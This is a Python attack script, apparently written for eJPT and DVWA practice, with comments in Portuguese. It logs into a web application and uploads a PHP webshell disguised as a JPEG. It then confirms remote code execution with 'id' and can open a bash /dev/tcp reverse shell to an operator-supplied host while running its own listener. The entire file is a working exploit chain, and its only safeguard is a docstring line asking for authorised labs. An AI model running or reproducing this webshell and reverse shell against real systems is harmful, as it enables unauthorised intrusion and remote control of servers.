#!/usr/bin/env python3
"""upload_rce_test.py — treino do Cenário C do eJPT contra um alvo com upload inseguro.

Faz o caminho completo, com prova em cada etapa:
  login -> upload de webshell -> execução de comando -> (opcional) reverse shell

Uso (precisa do venv: ~/venvs/pentest/bin/python):
  # só provar RCE
  ~/venvs/pentest/bin/python upload_rce_test.py -u http://IP/login.php -l admin -p password \
      --upload-path /vulnerabilities/upload/ --shell-dir /hackable/uploads/ --field Upload

  # reverse shell (inicia o listener aqui antes de disparar)
  ~/venvs/pentest/bin/python upload_rce_test.py ... --revshell LHOST:4444

Só usar em lab próprio ou alvo com autorização escrita (eJPT treino, DVWA, HTB).
"""
import argparse
import re
import socket
import sys
import threading
import time

from urllib.parse import urlparse

import requests

TOKEN_RE = re.compile(r"""name=['"]?([a-zA-Z0-9_\-]*(?:csrf|token)[a-zA-Z0-9_\-]*)['"]?\s+value=['"]([^'"]+)['"]""", re.I)


def login(s, url, user, pw, user_field, pass_field, extra):
    page = s.get(url, timeout=15).text
    data = {user_field: user, pass_field: pw}
    m = TOKEN_RE.search(page)
    if m:
        data[m.group(1)] = m.group(2)
    for e in extra:
        if "=" in e:
            k, v = e.split("=", 1)
            data[k] = v
    r = s.post(url, data=data, timeout=20, allow_redirects=True)
    print(f"[1] login HTTP {r.status_code} -> {r.url}")
    return "login" not in r.url.lower()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="URL do formulário de login")
    ap.add_argument("-l", "--user", required=True)
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", default="password")
    ap.add_argument("--extra", action="append", default=[], help='ex: "Login=Login"')
    ap.add_argument("--base", help="raiz do site (default: origem da URL de login)")
    ap.add_argument("--upload-path", default="/vulnerabilities/upload/")
    ap.add_argument("--shell-dir", default="/hackable/uploads/")
    ap.add_argument("--field", default="Upload", help="nome do botão de submit")
    ap.add_argument("--revshell", help="LHOST:LPORT para reverse shell")
    args = ap.parse_args()

    base = args.base or "{0.scheme}://{0.netloc}".format(urlparse(args.url))
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    if not login(s, args.url, args.user, args.password, args.user_field, args.pass_field, args.extra):
        print("[!] login falhou — sem sessão o resto não funciona")
        return 2

    payload = b'<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>'
    r = s.post(base + args.upload_path,
               data={args.field: "Upload"},
               files={"uploaded": ("shell.php", payload, "image/jpeg")}, timeout=25)
    print(f"[2] upload HTTP {r.status_code} ({len(r.text)} bytes)")

    shell = base + args.shell_dir + "shell.php"
    try:
        rr = s.get(shell, params={"c": "id"}, timeout=15)
        if "uid=" in rr.text:
            print(f"[3] RCE OK -> {rr.text.strip()}")
        else:
            print(f"[3] sem RCE em {shell} (HTTP {rr.status_code}) — conferir nome/caminho do arquivo")
            return 1
    except Exception as e:
        print("[3] erro ao chamar webshell:", e)
        return 1

    if not args.revshell:
        print("[4] reverse shell não pedido (use --revshell LHOST:PORT)")
        return 0

    host, port = args.revshell.split(":")
    recebido = []

    def listener():
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", int(port)))
        srv.listen(1)
        srv.settimeout(30)
        try:
            conn, addr = srv.accept()
            conn.settimeout(8)
            recebido.append(f"conexao de {addr}")
            conn.sendall(b"id; hostname\n")
            time.sleep(2)
            try:
                recebido.append(conn.recv(4096).decode(errors="replace"))
            except socket.timeout:
                recebido.append("(sem dados)")
            conn.close()
        except socket.timeout:
            recebido.append("(nenhuma conexao em 30s — firewall? LHOST errado?)")
        finally:
            srv.close()

    t = threading.Thread(target=listener, daemon=True)
    t.start()
    time.sleep(1)
    cmd = f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
    try:
        requests.get(shell, params={"c": cmd}, timeout=8)
    except Exception:
        pass
    t.join(timeout=35)
    print("[4] " + " | ".join(recebido))
    return 0


if __name__ == "__main__":
    sys.exit(main())
